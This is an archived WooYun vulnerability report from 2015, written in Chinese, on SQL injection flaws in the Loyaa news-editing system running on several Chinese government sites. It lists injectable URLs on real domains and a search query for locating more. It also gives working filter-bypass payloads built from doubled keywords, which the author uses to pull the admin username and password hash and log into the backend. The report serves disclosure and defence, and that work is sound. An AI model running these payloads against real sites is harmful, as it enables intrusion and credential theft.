{"id": 40862, "wybug_id": "wooyun-2015-095995", "wybug_title": "Loyaa 信息自动采编系统7处SQL注入绕过漏洞打包", "wybug_corp": "宜达科技", "wybug_author": "goubuli", "wybug_date": "2015-02-11 18:28", "wybug_open_date": "2015-05-14 14:36", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-02-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-02-13：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-02-16：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-04-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-14：\t细节向公众公开  简要描述： 某通用政府采编系统7处SQL注入绕过漏洞打包，成功进后台 详细说明：  这个漏洞wooyun暂时还没有提交。。。见截图漏洞一、注入点：1、/more.php如：http://www.jys.gov.cn/more.php?p=0&c=109016参数c2、videoMore.php如：http://www.jys.gov.cn/videoMore.php?p=0&c=109003参数c3、/detail.php所有参数4、/detail_zt.php所有参数5、/video.php所有参数6、/index2.php如：http://www.jys.gov.cn/video.php?c=109003&i=248251a所有参数7、hfrx.php如：http://www.jys.gov.cn/hfrx.php?c=109006&i=245224a所有参数漏洞二、爆路径：http://www.jiangyan.gov.cn/interface/jy_bbs_list.php?obj=ad_h2&c=5&n=3&t=46&tid=2\n\n搜索特征：1、gov.cn/detail.php?c=2、gov.cn/detail_zt.php?c=\n\n为了不损害目标站点及建站系统，标题写的比较隐晦，其实具体系统是《Loyaa 信息自动采编系统》 v3.0如采购截图：\n\n按照通用流程标准，需要有演示+案例。以两处较明显的特征搜索，其他的特征搜索不准确。搜索特征：第一处：\n\n第二处：\n\n案例：http://www.jys.gov.cn/detail.php?c=101002&i=248464http://huagang.gov.cn/detail.php?c=101203&i=205139http://jsjygsj.gov.cn/detail.php?c=101004&i=246715http://www.jsjyxzsp.gov.cn/detail.php?c=201811&i=49626http://jykfq.gov.cn/detail.php?c=301631&i=210108http://jysf.gov.cn/detail.php?c=222903&i=242453http://www.jyjtj.gov.cn/detail.php?c=201701&i=231307http://www.jsjyhrss.gov.cn/detail.php?c=101004&i=246591http://www.jysagr.gov.cn/detail.php?c=101102&i=34411http://www.jyhb.jiangyan.gov.cn/detail.php?c=211023&i=244371 \thttp://jyws.gov.cn/detail.php?c=212001&i=220976\thttp://www.jydx.org.cn/detail.php?c=101101&i=49881http://jslxz.cn/detail.php?c=201958&i=205507http://www.jsjy.agri.gov.cn/detail.php?c=201904&i=222360   漏洞证明：  演示：拿其中一个政府主站演示，演示一处，其他注入类似。。。注入点都一样。。。具体链接：http://www.jys.gov.cn/detail_zt.php?i=195998&c=105130直接提交'，爆出SQL，如图\n\n但是在用工具跑的过程中发现有防御。。。跑不出来数据。。。如图\n\n下面演示纯手工注入搞定管理员账户。。。1、提交and 1=1直接过滤了and和=，如图\n\n2、提交带有()的数据()也被过滤了。。。3、order by没有过滤order by\n\n搞到字段长度为：9接下来union 查询悲剧的是也被过滤了。。。这就不不截图了。。。4、绕过试了好多方法，如：URLEncode编码、tab、CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)、+拆解等等原来系统所做的过滤是replace一些关键字因此提交：\nhttp://www.jys.gov.cn/detail_zt.php?i=195998&c=105130 anandd 1 is false ununionion selselectect 1,2,3,4,5,6,7,8,9\n\n\n因为过滤了()，而且也知道是MySQL数据库，因此接下来就是要搞管理员信息，然后进后台。。由于在注入报错的时候能够看到具体的SQL，里面有一张表是：user_info 具体信息是：\nSelect \t\t\tnews_title.id, \t\t\tnews_title.title, \t\t\tnews_title.categoryId, \t\t\tnews_title.editorId, \t\t\tnews_title.fromWeb, \t\t\tnews_title.dateCreated, \t\t\tnews_detail.detail, \t\t\tnews_category.title as category_title, \t\t\tuser_info.personalOffice \t\tfrom \t\t\tnews_title, \t\t\tnews_detail, \t\t\tnews_category, \t\t\tuser_info \t\twhere \t\t\tnews_title.id=news_detail.titleId and \t\t\tnews_title.categoryId=news_category.customId and \t\t\tnews_title.editorId=user_info.id and \t\t\tnews_title.id=195998 and \t\t\tnews_title.archives=0  and \t\t\tnews_title.status>0 \t\t\t and news_title.categoryId=105130' \t\t\t\t\tlimit 1\n后台登录地址：http://houtai.jiangyan.gov.cn/在后台登录试了弱口令不能进去，查看页面源码找出用户名、密码字段：\n\n分别是：username、userpassword下面查出用户名和密码\nhttp://www.jys.gov.cn/detail_zt.php?i=195998&c=105130 anandd 1 is false ununionion selselectect 1,username,3,4,id,userpassword,7,8,9 frfromom user_info\n\n\n得到用户名：admin密码：*7D4170B3DFD2B12261BC4D66C055EF5962E1C373密文类型:mysql5。\n\n最终几毛钱解密成功。。。这里密码不公开了。。。\n\n登录成功\n\n用户信息\n\n申明：未做任何破坏操作。   修复方案：  1、过滤2、增加WAF3、添加友好错误页面   版权声明：转载请注明来源 goubuli@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：17  确认时间：2015-02-13 14:34 厂商回复： CNVD确认所述情况，由CNVD通过网站公开联系方式向软件生产厂商通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-03-26 16:32 |    \t\t带我玩 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:6        | 带我玩)\t\t \n  我去...还要钱才能看?    \n     2015-05-18 16:47 |    \t\tsauren \t\t\t( 实习白帽子  |\t\t\t        Rank:34 漏洞数:10        | 天天打DOTA，快乐你我他~)\t\t \n  火钳刘明~    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 17, "Ranks": null}